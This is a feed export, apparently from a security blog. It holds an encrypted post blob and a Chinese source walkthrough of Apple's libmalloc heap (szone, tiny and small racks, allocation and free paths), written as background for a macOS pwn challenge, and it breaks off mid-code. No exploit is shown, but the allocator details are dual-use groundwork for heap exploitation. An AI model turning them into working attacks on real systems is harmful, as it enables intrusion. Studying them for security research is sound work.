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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>源码解读macOS/iOS Heap</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/深入理解macos-heap/深入理解macos-heap/</id>
    <published>2019-04-01T07:30:31.000Z</published>
    <updated>2019-04-02T05:50:15.199Z</updated>
    
    <content type="html"><![CDATA[<h3 id="源码解读macOS-iOS-Heap"><a href="#源码解读macOS-iOS-Heap" class="headerlink" title="源码解读macOS/iOS Heap"></a>源码解读macOS/iOS Heap</h3><blockquote><p>关于linux的堆管理已经有很多人写了很多相关的分析，但在mac平台的堆相关的资料却很少。本文由tctf的一道mac平台pwn题目引起，是我对macOS/iOS的堆管理的一些理解，希望有所帮助。</p></blockquote><h4 id="从malloc说起"><a href="#从malloc说起" class="headerlink" title="从malloc说起"></a>从malloc说起</h4><p><code>malloc</code>是我们经常使用的函数，这里也是<code>libmalloc.dylib</code>暴露出来的接口，另外苹果开源了<a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">libmalloc代码</a>。所以接下来我们就从源码的角度深入下去。</p><pre><code class="c">void *malloc(size_t size){    void *retval;    retval = malloc_zone_malloc(default_zone, size);    if (retval == NULL) {        errno = ENOMEM;    }    return retval;}</code></pre><p>这里实际调用了<code>malloc_zone_malloc</code>函数，传入了<code>default_zone</code>全局变量</p><pre><code class="c">static virtual_default_zone_t virtual_default_zone__attribute__((section(&quot;__DATA,__v_zone&quot;)))__attribute__((aligned(PAGE_MAX_SIZE))) = {    NULL,    NULL,    default_zone_size,    default_zone_malloc,    default_zone_calloc,    default_zone_valloc,    default_zone_free,    default_zone_realloc,    default_zone_destroy,    DEFAULT_MALLOC_ZONE_STRING,    default_zone_batch_malloc,    default_zone_batch_free,    &amp;default_zone_introspect,    10,    default_zone_memalign,    default_zone_free_definite_size,    default_zone_pressure_relief,    default_zone_malloc_claimed_address,};static malloc_zone_t *default_zone = &amp;virtual_default_zone.malloc_zone;</code></pre><p>这里初始化了一个默认的zone，正如名字一样<code>virtual_default_zone</code>其实是一个虚假的zone，接下来是调用<code>malloc_zone_malloc</code></p><pre><code class="c">void *malloc_zone_malloc(malloc_zone_t *zone, size_t size){    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_START, (uintptr_t)zone, size, 0, 0);    void *ptr;    if (malloc_check_start &amp;&amp; (malloc_check_counter++ &gt;= malloc_check_start)) {        internal_check();    }    if (size &gt; MALLOC_ABSOLUTE_MAX_SIZE) {        return NULL;    }    ptr = zone-&gt;malloc(zone, size);        // if lite zone is passed in then we still call the lite methods    if (malloc_logger) {        malloc_logger(MALLOC_LOG_TYPE_ALLOCATE | MALLOC_LOG_TYPE_HAS_ZONE, (uintptr_t)zone, (uintptr_t)size, 0, (uintptr_t)ptr, 0);    }    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_END, (uintptr_t)zone, size, (uintptr_t)ptr, 0);    return ptr;}</code></pre><p>这里调用的<code>ptr = zone-&gt;malloc(zone, size);</code>就是<code>default_zone_malloc</code>函数</p><pre><code class="c">static void *default_zone_malloc(malloc_zone_t *zone, size_t size){    zone = runtime_default_zone();    return zone-&gt;malloc(zone, size);}</code></pre><p>这里的<code>runtime_default_zone()</code>很重要，其实这里才是去真正的初始化zone</p><pre><code class="c">runtime_default_zone   // inline----inline_malloc_default_zone  //inline--------_malloc_initialize_once  //inline ------------_malloc_initialize()</code></pre><p>下面看<code>_malloc_initialize</code>函数，去掉了一些不相干代码</p><pre><code class="c">static void_malloc_initialize(void *context __unused){    MALLOC_LOCK();    unsigned n;    malloc_zone_t *zone = NULL;    ...    zone = create_scalable_zone(0, malloc_debug_flags);    malloc_zone_register_while_locked(zone);    malloc_set_zone_name(zone, DEFAULT_MALLOC_ZONE_STRING);        initial_default_zone = zone;    if (n != 0) { // make the default first, for efficiency        unsigned protect_size = malloc_num_zones_allocated * sizeof(malloc_zone_t *);        malloc_zone_t *hold = malloc_zones[0];        if (hold-&gt;zone_name &amp;&amp; strcmp(hold-&gt;zone_name, DEFAULT_MALLOC_ZONE_STRING) == 0) {            malloc_set_zone_name(hold, NULL);        }        mprotect(malloc_zones, protect_size, PROT_READ | PROT_WRITE);        malloc_zones[0] = malloc_zones[n];        malloc_zones[n] = hold;        mprotect(malloc_zones, protect_size, PROT_READ);    }    ...}</code></pre><p>这里主要看<code>create_scalable_zone</code>函数，所以默认的zone实际上就是scalable zone</p><pre><code class="c">malloc_zone_t *create_scalable_zone(size_t initial_size, unsigned debug_flags) {    return (malloc_zone_t *) create_scalable_szone(initial_size, debug_flags);}szone_t *create_scalable_szone(size_t initial_size, unsigned debug_flags){    szone_t *szone;    /* get memory for the zone. */    szone = mvm_allocate_pages(SZONE_PAGED_SIZE, 0, 0, VM_MEMORY_MALLOC);    if (!szone) {        return NULL;    }    ...    // Query the number of configured processors.    // Uniprocessor case gets just one tiny and one small magazine (whose index is zero). This gives    // the same behavior as the original scalable malloc. MP gets per-CPU magazines    // that scale (way) better.    unsigned int max_mags = mag_max_magazines();    uint32_t num_magazines = (max_mags &gt; 1) ? MIN(max_mags, TINY_MAX_MAGAZINES) : 1;    rack_init(&amp;szone-&gt;tiny_rack, RACK_TYPE_TINY, num_magazines, debug_flags);    rack_init(&amp;szone-&gt;small_rack, RACK_TYPE_SMALL, num_magazines, debug_flags);#if CONFIG_LARGE_CACHE    // madvise(..., MADV_REUSABLE) death-row arrivals above this threshold [~0.1%]    szone-&gt;large_entry_cache_reserve_limit = (size_t)(memsize &gt;&gt; 10);    /* &lt;rdar://problem/6610904&gt; Reset protection when returning a previous large allocation? */    int32_t libSystemVersion = NSVersionOfLinkTimeLibrary(&quot;System&quot;);    if ((-1 != libSystemVersion) &amp;&amp; ((libSystemVersion &gt;&gt; 16) &lt; 112) /* CFSystemVersionSnowLeopard */) {        szone-&gt;large_legacy_reset_mprotect = TRUE;    } else {        szone-&gt;large_legacy_reset_mprotect = FALSE;    }#endif    // Initialize the security token.    szone-&gt;cookie = (uintptr_t)malloc_entropy[0];    szone-&gt;basic_zone.version = 10;    szone-&gt;basic_zone.size = (void *)szone_size;    szone-&gt;basic_zone.malloc = (void *)szone_malloc;    szone-&gt;basic_zone.calloc = (void *)szone_calloc;    szone-&gt;basic_zone.valloc = (void *)szone_valloc;    szone-&gt;basic_zone.free = (void *)szone_free;    szone-&gt;basic_zone.realloc = (void *)szone_realloc;    szone-&gt;basic_zone.destroy = (void *)szone_destroy;    szone-&gt;basic_zone.batch_malloc = (void *)szone_batch_malloc;    szone-&gt;basic_zone.batch_free = (void *)szone_batch_free;    szone-&gt;basic_zone.introspect = (struct malloc_introspection_t *)&amp;szone_introspect;    szone-&gt;basic_zone.memalign = (void *)szone_memalign;    szone-&gt;basic_zone.free_definite_size = (void *)szone_free_definite_size;    szone-&gt;basic_zone.pressure_relief = (void *)szone_pressure_relief;    szone-&gt;basic_zone.claimed_address = (void *)szone_claimed_address;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved1 = 0;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved2 = 0;    /* Prevent overwriting the function pointers in basic_zone. */    mprotect(szone, sizeof(szone-&gt;basic_zone), PROT_READ);    szone-&gt;debug_flags = debug_flags;    _malloc_lock_init(&amp;szone-&gt;large_szone_lock);    szone-&gt;cpu_id_key = -1UL; // Unused.    CHECK(szone, __PRETTY_FUNCTION__);    return szone;}</code></pre><p>这个函数分配并且初始化了szone，设置了<code>szone_malloc</code>、<code>szone_free</code>等函数</p><p>所以后面在调用<code>malloc</code>和<code>free</code>的时候实际上调用的是<code>szone_malloc</code>、<code>szone_free</code>。<code>szone_malloc</code>的实现涉及到苹果关于堆设计中最重要的部分，这里先不展开讲解。可以看出苹果设计的这种结构很方便扩展，事实上的确如此，不仅是scalable zone，还可以注册WebKit Malloc、GFXMallocZone、QuartzCore。由对应zone的<code>malloc_zone_*</code>进行实际的内存分配工作。</p><p>下面是程序第一次调用malloc的栈帧，可以看出与我们分析的调用顺序一致</p><pre><code class="c"> *  frame #0: 0x00007fff60bd72af libsystem_malloc.dylib`create_scalable_szone    frame #1: 0x00007fff60bd6e71 libsystem_malloc.dylib`_malloc_initialize + 1482    frame #2: 0x00007fff60c0facb libsystem_platform.dylib`_os_once_callout + 18    frame #3: 0x00007fff60bd68a5 libsystem_malloc.dylib`default_zone_malloc + 77    frame #4: 0x00007fff60bd6807 libsystem_malloc.dylib`malloc_zone_malloc + 103    frame #5: 0x00007fff60bd6783 libsystem_malloc.dylib`malloc + 24    frame #6: 0x00007fff60a9831d libsystem_c.dylib`arc4_init + 109    frame #7: 0x00007fff60a98479 libsystem_c.dylib`arc4random_buf + 37    frame #8: 0x00007fff5f94644e libobjc.A.dylib`_read_images + 396    frame #9: 0x00007fff5f945473 libobjc.A.dylib`map_images_nolock + 1197    frame #10: 0x00007fff5f959279 libobjc.A.dylib`map_images + 68    ....</code></pre><h4 id="scalable-zone"><a href="#scalable-zone" class="headerlink" title="scalable zone"></a>scalable zone</h4><p>szone包含两个racks，分别是tiny和small rack</p><table><thead><tr><th>rack</th><th>32位机器</th><th>64位机器</th></tr></thead><tbody><tr><td>tiny</td><td>&lt;= 496B</td><td>&lt;= 1008B</td></tr><tr><td>small</td><td>&lt;= 128KB</td><td>&lt;=128KB</td></tr></tbody></table><p>大于127KB的就由large allocator分配，直接采用分配页大小的方式。这里不详细讨论。</p><ul><li>有几个处理器，rack就有几个magazine</li><li>每个magazine有多个regions，tiny(1MB)、small(8MB)</li><li>每个region被分为quantum，tiny(16B，64520 Q/region)、small(512B，16319 Q/region)</li></ul><p>具体可以从后面结构体中看出来其包含关系。</p><h5 id="malloc-gt-szone-malloc-gt-szone-malloc-should-clear"><a href="#malloc-gt-szone-malloc-gt-szone-malloc-should-clear" class="headerlink" title="malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear"></a>malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear</h5><pre><code class="c">MALLOC_NOINLINE void *szone_malloc_should_clear(szone_t *szone, size_t size, boolean_t cleared_requested){    void *ptr;    msize_t msize;    if (size &lt;= SMALL_THRESHOLD) {        // tiny size: &lt;=1008 bytes (64-bit), &lt;=496 bytes (32-bit)        // think tiny        msize = TINY_MSIZE_FOR_BYTES(size + TINY_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = tiny_malloc_should_clear(&amp;szone-&gt;tiny_rack, msize, cleared_requested);    } else if (size &lt;= szone-&gt;large_threshold) {        // small size: &lt;=15k (iOS), &lt;=64k (large iOS), &lt;=128k (macOS)        // think small        msize = SMALL_MSIZE_FOR_BYTES(size + SMALL_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = small_malloc_should_clear(&amp;szone-&gt;small_rack, msize, cleared_requested);    } else {        // large: all other allocations        size_t num_kernel_pages = round_page_quanta(size) &gt;&gt; vm_page_quanta_shift;        if (num_kernel_pages == 0) { /* Overflowed */            ptr = 0;        } else {            ptr = large_malloc(szone, num_kernel_pages, 0, cleared_requested);        }    }    return ptr;}</code></pre><p>上面可以清楚看出会根据其申请内存大小从tiny、small、large三种方式分配。这里以tiny为例</p><h5 id="tiny-malloc-should-clear"><a href="#tiny-malloc-should-clear" class="headerlink" title="tiny_malloc_should_clear"></a>tiny_malloc_should_clear</h5><pre><code class="c">void *tiny_malloc_should_clear(rack_t *rack, msize_t msize, boolean_t cleared_requested){    void *ptr;    mag_index_t mag_index = tiny_mag_get_thread_index() % rack-&gt;num_magazines;    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_malloc, (uintptr_t)rack, TINY_BYTES_FOR_MSIZE(msize), (uintptr_t)tiny_mag_ptr, cleared_requested);#if DEBUG_MALLOC    if (DEPOT_MAGAZINE_INDEX == mag_index) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;malloc called for magazine index -1\n&quot;);        return (NULL);    }    if (!msize) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;invariant broken (!msize) in allocation (region)\n&quot;);        return (NULL);    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    ptr = tiny_mag_ptr-&gt;mag_last_free;    if (tiny_mag_ptr-&gt;mag_last_free_msize == msize) {        // we have a winner        tiny_mag_ptr-&gt;mag_last_free = NULL;        tiny_mag_ptr-&gt;mag_last_free_msize = 0;        tiny_mag_ptr-&gt;mag_last_free_rgn = NULL;        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        CHECK(szone, __PRETTY_FUNCTION__);        if (cleared_requested) {            memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));        }#if DEBUG_MALLOC        if (LOG(szone, ptr)) {            malloc_report(ASL_LEVEL_INFO, &quot;in tiny_malloc_should_clear(), tiny cache ptr=%p, msize=%d\n&quot;, ptr, msize);        }#endif        return ptr;    }#endif /* CONFIG_TINY_CACHE */    while (1) {        ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);        if (ptr) {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            if (cleared_requested) {                memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));            }            return ptr;        }        if (tiny_get_region_from_depot(rack, tiny_mag_ptr, mag_index, msize)) {            ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);            if (ptr) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                if (cleared_requested) {                    memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));                }                return ptr;            }        }        // The magazine is exhausted. A new region (heap) must be allocated to satisfy this call to malloc().        // The allocation, an mmap() system call, will be performed outside the magazine spin locks by the first        // thread that suffers the exhaustion. That thread sets &quot;alloc_underway&quot; and enters a critical section.        // Threads arriving here later are excluded from the critical section, yield the CPU, and then retry the        // allocation. After some time the magazine is resupplied, the original thread leaves with its allocation,        // and retry-ing threads succeed in the code just above.        if (!tiny_mag_ptr-&gt;alloc_underway) {            void *fresh_region;            // time to create a new region (do this outside the magazine lock)            tiny_mag_ptr-&gt;alloc_underway = TRUE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            fresh_region = mvm_allocate_pages_securely(TINY_REGION_SIZE, TINY_BLOCKS_ALIGN, VM_MEMORY_MALLOC_TINY, rack-&gt;debug_flags);            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);            // DTrace USDT Probe            MAGMALLOC_ALLOCREGION(TINY_SZONE_FROM_RACK(rack), (int)mag_index, fresh_region, TINY_REGION_SIZE);            if (!fresh_region) { // out of memory!                tiny_mag_ptr-&gt;alloc_underway = FALSE;                OSMemoryBarrier();                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                return NULL;            }            ptr = tiny_malloc_from_region_no_lock(rack, tiny_mag_ptr, mag_index, msize, fresh_region);            // we don&#39;t clear because this freshly allocated space is pristine            tiny_mag_ptr-&gt;alloc_underway = FALSE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            return ptr;        } else {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            yield();            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);        }    }    /* NOTREACHED */}</code></pre><p>这里的<code>if (tiny_mag_ptr-&gt;mag_last_free_msize == msize)</code>是判断申请大小是否和缓存的大小相同，如果相同，则直接把该内存返回给程序。反之则从<code>ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);</code>free list中去获取刚好大于该大小的free list。这里的free list是按quantum的倍数递增的一个链表。若还是不能满足则去freelist中由合并得到的较大block中去分配。还不能满足则去region剩余部分申请。最后还不满足则申请新的一个region。申请失败则返回NULL。</p><h5 id="free-gt-malloc-zone-free-gt-szone-free"><a href="#free-gt-malloc-zone-free-gt-szone-free" class="headerlink" title="free-&gt;malloc_zone_free-&gt;szone_free"></a>free-&gt;malloc_zone_free-&gt;szone_free</h5><pre><code class="c">voidszone_free(szone_t *szone, void *ptr){    region_t tiny_region;    region_t small_region;#if DEBUG_MALLOC    if (LOG(szone, ptr)) {        malloc_report(ASL_LEVEL_INFO, &quot;in szone_free with %p\n&quot;, ptr);    }#endif    if (!ptr) {        return;    }    /*     * Try to free to a tiny region.     */    if ((uintptr_t)ptr &amp; (TINY_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed\n&quot;, ptr);        return;    }    if ((tiny_region = tiny_region_for_ptr_no_lock(&amp;szone-&gt;tiny_rack, ptr)) != NULL) {        if (TINY_INDEX_FOR_PTR(ptr) &gt;= NUM_TINY_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed\n&quot;, ptr);            return;        }        free_tiny(&amp;szone-&gt;tiny_rack, ptr, tiny_region, 0);        return;    }    /*     * Try to free to a small region.     */    if ((uintptr_t)ptr &amp; (SMALL_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed (2)\n&quot;, ptr);        return;    }    if ((small_region = small_region_for_ptr_no_lock(&amp;szone-&gt;small_rack, ptr)) != NULL) {        if (SMALL_META_INDEX_FOR_PTR(ptr) &gt;= NUM_SMALL_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed (2)\n&quot;, ptr);            return;        }        free_small(&amp;szone-&gt;small_rack, ptr, small_region, 0);        return;    }    /* check that it&#39;s a legal large allocation */    if ((uintptr_t)ptr &amp; (vm_page_quanta_size - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;non-page-aligned, non-allocated pointer %p being freed\n&quot;, ptr);        return;    }    free_large(szone, ptr);}</code></pre><p>同样，free的时候会先判断该内存是否属于tiny，small，large。则选取对应的free函数。这里以tiny为例</p><pre><code class="c">voidfree_tiny(rack_t *rack, void *ptr, region_t tiny_region, size_t known_size){    msize_t msize;    boolean_t is_free;    mag_index_t mag_index = MAGAZINE_INDEX_FOR_TINY_REGION(tiny_region);    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_free, (uintptr_t)rack, (uintptr_t)ptr, (uintptr_t)tiny_mag_ptr, known_size);    // ptr is known to be in tiny_region    if (known_size) {        msize = TINY_MSIZE_FOR_BYTES(known_size + TINY_QUANTUM - 1);    } else {        msize = get_tiny_meta_header(ptr, &amp;is_free);        if (is_free) {            free_tiny_botch(rack, ptr);            return;        }    }#if DEBUG_MALLOC    if (!msize) {        malloc_report(ASL_LEVEL_ERR, &quot;*** free_tiny() block in use is too large: %p\n&quot;, ptr);        return;    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    // Depot does not participate in CONFIG_TINY_CACHE since it can&#39;t be directly malloc()&#39;d    if (DEPOT_MAGAZINE_INDEX != mag_index) {        if (msize &lt; TINY_QUANTUM) {                      // to see if the bits fit in the last 4 bits            void *ptr2 